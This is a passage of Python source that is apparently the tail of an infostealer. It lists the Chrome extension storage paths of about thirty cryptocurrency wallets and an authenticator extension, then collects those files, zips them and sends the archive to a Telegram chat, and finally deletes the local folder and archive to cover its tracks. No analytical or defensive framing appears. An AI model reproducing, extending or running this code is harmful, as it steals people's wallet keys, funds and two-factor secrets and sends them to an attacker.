    "Ronin": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"),
    "Exodus": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"),
    "Coin98": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"),
    "Authenticator": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"),
    "MathWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"),
    "YoroiWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"),
    "Wombat": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"),
    "EVERWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"),
    "KardiaChain": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"),
    "XDEFI": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
    "Nami": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"),
    "TerraStation": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"),
    "MartianAptos": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"),
    "TON": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"),
    "Keplr": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"),
    "CryptoCom": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj"),
    "PetraAptos": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"),
    "OKX": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge"),
    "Sender": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg"),
    "Sui": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil"),
    "SuietSui": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd"),
    "Braavos": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma"),
    "FewchaMove": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"),
    "ArgentX": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb"),
    "iWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"),
    "OxyGenAtomicWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"),
    "PaliWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"),
    "MaiarDeFiWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"),
    "TempleWallet": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"),
}

local_wallet_data(WorkPath, wallet_paths)
file_send = zip_workpath(WorkPath,WorkName)
send_telegram_document(Telegram_token, Telegram_chat_id, file_send, message)
delete_folder_and_file(WorkPath, file_send)

